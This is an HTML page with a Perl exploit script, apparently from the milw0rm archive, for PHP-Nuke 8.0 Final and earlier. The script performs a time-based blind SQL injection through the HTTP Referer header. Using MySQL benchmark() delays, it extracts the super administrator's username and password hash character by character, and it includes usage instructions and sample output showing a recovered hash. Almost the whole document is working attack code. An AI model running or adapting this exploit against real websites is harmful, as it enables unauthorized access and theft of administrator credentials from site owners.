<html><head><title>PHP-Nuke <= 8.0 Final (INSERT) Blind SQL Injection Exploit (mysql)</title></head><pre>#!/usr/bin/perl 
#0day exploit for PHP-nuke &lt;=8.0 Final
#Blind sql injection attack in INSERT syntax
#version for mysql &gt;= 4.0.24, using 'brute force'
#Coded by:Maciej `krasza` Kukla[krasza@gmail.com]
#Screenshot:
#0day exploit for PHP-nuke &lt;=8.0 Final
#Sql injection attack in INSERT syntax
#Coded by:Maciej `krasza` Kukla[krasza@gmail.com]
#
#[+]Time normal query: 2 seconds
#[+]Length user's record: 5
#[+]Length password's record: 32
#[+]Login:
#admin
#[+]Password:
#b481ab90de84a345c665f1e4ef3c2
#[+]Super admin:
#admin:b481ab90de84a345c66585e1f4cf16e4
use strict;
use warnings;
use LWP;
my $offset=4;#It is the most important variable!!
my $adres=shift or help();
my $ua = LWP::UserAgent-&gt;new;
my $zadanie = HTTP::Request-&gt;new(GET =&gt; $adres);
my ($respone,$komenda,$poczatek,$koniec,$czas_nor,$i,$j,$dlugosc_user,$user,$hash,$referer,$czy_dziala,$znak);
banner();
$czas_nor=polacz(&quot;http://www.krasza.int.pl&quot;);
print &quot;[+]Time normal query: $czas_nor seconds\n&quot;;
$dlugosc_user=ustal_dlugosc(&quot;aid&quot;,8);
print &quot;[+]Length user's record: $dlugosc_user\n&quot;;
print &quot;[+]Length password's record: 32\n&quot;;
print &quot;[+]Login:\n&quot;;
$user=brute_force_aid($dlugosc_user);
print &quot;[+]Password:\n&quot;;
$hash=brute_force_pass(32);
print &quot;[+]Super admin:\n&quot;;
print &quot;$user:$hash\n&quot;;
##
sub brute_force_pass{
	my ($dlugosc)=@_;
	my ($i,$j,$referer,$wynik,$dolny_zakres);
	for($i=1;$i&lt;=$dlugosc;$i++){
		for($j=48;$j&lt;=122;$j++){
		$referer=&quot;http://www.krasza.int.pl'),(-1,(SELECT IF((ASCII(SUBSTRING(`pwd`,&quot;.$i.&quot;,1))=&quot;.$j.&quot;) &amp; 1, benchmark(50000000,CHAR(0)),0) FROM `nuke_authors` WHERE `radminsuper`=1))/*&quot;;
        	$czy_dziala=czy_dziala($referer);
        		if($czy_dziala==1){
					$znak=chr($j);
					print &quot;$znak&quot;;
					$wynik.=$znak;
				if($i&lt;$dlugosc){
					$i+=1;
					$j=47;
				}else{
					last;
				}
			}
			#przeskok-optymalizacja;]
			if($j==57){
				$j=96;
			}
		}
	}
		print &quot;\n&quot;;
		return $wynik;
}
sub brute_force_aid{
        my ($dlugosc)=@_;
        my ($i,$j,$referer,$wynik,$dolny_zakres);
        for($i=1;$i&lt;=$dlugosc;$i++){
                for($j=48;$j&lt;=122;$j++){
                $referer=&quot;http://www.krasza.int.pl'),(-1,(SELECT IF((ASCII(SUBSTRING(`aid`,&quot;.$i.&quot;,1))=&quot;.$j.&quot;) &amp; 1, benchmark(50000000,CHAR(0)),0) FROM `nuke_authors` WHERE `radminsuper`=1))/*&quot;;
                $czy_dziala=czy_dziala($referer);
                        if($czy_dziala==1){
					$znak=chr($j);
                                	print &quot;$znak&quot;;
					$wynik.=$znak;
				if($i&lt;$dlugosc){
                                	$i+=1;
					$j=47;
				}else{
					last;
				}
                        }
			if($j==57){
				$j=64;
			}
			if($j==90){
				$j=96;
			}
                }
        }
                print &quot;\n&quot;;
                return $wynik;
}
sub ustal_dlugosc{
	my ($pole,$len)=@_;
	my ($referer,$narazie_dziala_liczba,$nie_dziala_liczba);
	$narazie_dziala_liczba=0;
	$nie_dziala_liczba=65;
	#for($len=1;$len&lt;64;$len++){
	while($len&lt;=64){
		if($narazie_dziala_liczba==$len || $nie_dziala_liczba&lt;=$len){
			return $narazie_dziala_liczba;
		}
		$referer=&quot;http://www.krasza.int.pl'),(-1,(SELECT IF((LENGTH(`&quot;.$pole.&quot;`)&gt;&quot;.$len.&quot;) &amp; 1, benchmark(50000000,CHAR(0)),0) FROM `nuke_authors` WHERE `radminsuper`=1))/*&quot;;
		$czy_dziala=czy_dziala($referer);
		if($czy_dziala==1){
			$narazie_dziala_liczba=$len+1;
			$len+=2;
		}else{
			$nie_dziala_liczba=$len+1;
			$len-=1;
		}
	}
	print &quot;[-]Exploit Failed\n&quot;;
	exit;
}
sub czy_dziala{
	my ($refik)=@_;
	my $czas_zapytania;
	$czas_zapytania=polacz($refik);
	if($czas_zapytania&gt;$czas_nor+$offset){
		return 1;
	}else{
		return 0;
	}
}
sub polacz{
	my ($referrer)=@_;
	my ($czas,$czas_poczatek,$czas_koniec);
	$zadanie-&gt;referer($referrer);
	$czas_poczatek=time();
        $respone=$ua-&gt;request($zadanie);
        $respone-&gt;is_success or die &quot;$adres : &quot;,$respone-&gt;message,&quot;\n&quot;;
        $czas_koniec=time();
	$czas=$czas_koniec-$czas_poczatek;
	return $czas;
}
sub banner{
	print &quot;0day exploit for PHP-nuke &lt;=8.0 Final\n&quot;;
        print &quot;Blind sql injection attack in INSERT syntax\n&quot;;
	print &quot;version mysql &gt;= 4.0.24, using 'brute force'\n&quot;;
        print &quot;Coded by:Maciej `krasza` Kukla[krasza\@gmail.com]\n\n&quot;;
}
sub help{
	print &quot;0day exploit for PHP-nuke &lt;=8.0 Final\n&quot;;
	print &quot;Blind sql injection attack in INSERT syntax\n&quot;;
	print &quot;version mysql &gt;= 4.0.24, using 'brute force'\n&quot;;
	print &quot;Coded by:Maciej `krasza` Kukla[krasza\@gmail.com]\n&quot;;
	print &quot;Use:\n&quot;;
	print &quot;\tperl exploit.pl [url]\n&quot;;
	print &quot;\t[url]-vicitim webpage with index.php\n&quot;;
	print &quot;Example:\n&quot;;
	print &quot;\tperl bruteforce.pl http://phpnuke.org/index.php\n&quot;;
	exit(0);
}

# milw0rm.com [2007-02-20]</pre></html>